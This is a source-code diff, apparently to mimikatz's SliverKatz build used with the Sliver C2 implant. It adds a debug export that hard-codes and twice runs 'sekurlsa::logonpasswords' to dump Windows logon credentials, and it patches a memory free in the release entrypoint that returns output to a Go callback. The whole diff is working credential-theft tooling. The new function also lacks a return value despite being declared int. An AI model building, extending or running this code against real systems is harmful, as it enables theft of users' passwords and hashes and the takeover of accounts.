@@ -255,7 +255,56 @@ __declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
 }
 #endif
 
-#if defined(_SLIVERKATZ)
+#if defined(_SLIVERKATZ) && defined(_DEBUG)
+__declspec(dllexport) int __cdecl testentrypoint() {
+	int argc = 0;
+	wchar_t** argv;
+	wchar_t* input;
+	char* argsBuffer = "sekurlsa::logonpasswords";
+	SIZE_T bufferSize = strlen(argsBuffer);
+	input = malloc(sizeof(wchar_t) * bufferSize + 2);
+	memset(input, 0x0, sizeof(wchar_t) * bufferSize + 2);
+	mbstowcs(input, argsBuffer, bufferSize);
+
+	if (argv = CommandLineToArgvW(input, &argc))
+	{
+		outputBufferElements = 0xff;
+		outputBufferElementsPosition = 0;
+		if (outputBuffer = (wchar_t*)LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
+			wmain(argc, argv);
+		LocalFree(argv);
+	}
+	char* output = NULL;
+	output = malloc(sizeof(char) * (outputBufferElements + 2));
+	memset(output, 0x0, sizeof(char) * (outputBufferElements + 2));
+	wcstombs(output, outputBuffer, sizeof(char) * (outputBufferElements + 2));
+	LocalFree(outputBuffer);
+	free(output);
+	free(input);
+
+	input = malloc(sizeof(wchar_t) * bufferSize + 2);
+	memset(input, 0x0, sizeof(wchar_t) * bufferSize + 2);
+	mbstowcs(input, argsBuffer, bufferSize);
+
+	if (argv = CommandLineToArgvW(input, &argc))
+	{
+		outputBufferElements = 0xff;
+		outputBufferElementsPosition = 0;
+		if (outputBuffer = (wchar_t*)LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
+			wmain(argc, argv);
+		LocalFree(argv);
+	}
+
+	output = malloc(sizeof(char) * (outputBufferElements + 2));
+	memset(output, 0x0, sizeof(char) * (outputBufferElements + 2));
+	wcstombs(output, outputBuffer, sizeof(char) * (outputBufferElements + 2));
+	LocalFree(outputBuffer);
+	free(output);
+	free(input);
+}
+
+#endif
+#if defined(_SLIVERKATZ) && !defined(_DEBUG)
 __declspec(dllexport) int __cdecl entrypoint(char* argsBuffer, SIZE_T bufferSize, goCallback callback) {
 	int argc = 0;
 	wchar_t** argv;
@@ -278,6 +327,7 @@ __declspec(dllexport) int __cdecl entrypoint(char* argsBuffer, SIZE_T bufferSize
 	memset(output, 0x0, sizeof(char) * (outputBufferElements + 2));
 	wcstombs(output, outputBuffer, sizeof(char) * (outputBufferElements + 2));
 	callback(output, strlen(output));
+	LocalFree(outputBuffer);
 	free(output);
 	free(input);
 	return 1;
